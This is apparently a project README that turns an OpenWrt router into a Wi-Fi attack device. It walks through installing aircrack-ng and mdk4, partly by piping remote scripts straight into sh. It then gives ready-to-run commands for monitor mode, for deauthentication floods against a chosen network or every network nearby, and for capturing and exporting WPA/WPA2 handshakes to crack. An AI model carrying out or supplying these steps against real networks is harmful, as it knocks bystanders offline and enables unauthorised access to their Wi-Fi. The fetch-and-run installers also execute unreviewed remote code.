# Requirements 
- Mediatek MT7628DAN Router Chipset
- Mipsel_24kc .ipk package
- Openwrt firmware version 22.03.*

# Install package 
```
opkg update && opkg install airmon-ng aircrack-ng
```
# Install mdk4
> (mipsel_24kc)
```sh
opkg update && wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mdk4_4.2-5_mipsel_24kc.ipk && opkg install mdk4.ipk
```

# Notes
- Functions similar on linux aircrack-ng aireplay-ng and mdk4
- Can capture WPA/WPA2 Handshake
- Doesn't work for openwrt version 23, 24 and 25

# Root access 
```sh
ssh root@192.168.1.1
```
```sh
telnet 192.168.1.1
```

# Auto Install
```sh
opkg update && wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/install | sh
````
# Install Monitor Mode
```sh
wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/wlan0mon | sh
```
# Run monitor mode
> script
```
iw phy phy0 interface add wlan0mon type monitor
ip link set wlan0mon up
```
> short
```sh
sh wlan0mon
```
# Enable full monitor mode using airmon-ng (optional)
```
airmon-ng start wlan0
```
# Scan wifi from the terminal
```
iw wlan0 scan | grep BSS
```
# Scan wifi using airodump-ng
```
sh wlan0mon && airodump-ng wlan0mon
```
# Deauth attack using mdk4
> 1.Enable monitor mode
```
sh wlan0mon && airodump-ng wlan0mon
```
> 2.Deauth a specific target BSSID
```
mdk4 wlan0mon d -B (BSSID)
```
> 3.Deauth all
```
mdk4 wlan0mon d
```
# Deauth attack using aireplay-ng
> 1.Enable the monitor mode
```
sh wlan0mon && airodump-ng wlan0mon
```
> 2.Deauth a specific BSSID
```
aireplay-ng wlan0mon --deauth 0 -a (BSSID) --ignore-negative-one
```
-------
# Capture the 4way handshakes
> 1.Listen to a specific bssid
```
airodump-ng -c (channel) --bssid (BSSID) -w handshake wlan0mon
```
> 2.Open a new terminal to deauth the BSSID
```
aireplay-ng wlan0mon --deauth 0 -a (BSSID) --ignore-negative-one
```
# Export the handshake
> [!Tip]
> install SFTP server on both system in order that SCP to work

> Openwrt: `opkg install openssh-sftp-server`

> Linux/Termux: `apt install openssh-sftp-server`

- Termux Terminal 
```sh
scp root@192.168.1.1:*.cap storage/downloads
```
- Kali terminal 
```sh
scp root@192.168.1.1:*.cap /home/*/Download
```

# More info
 - aireplay-ng --help
 - airodump-ng --help
 - aircrack-ng --help
 - mdk4 --help
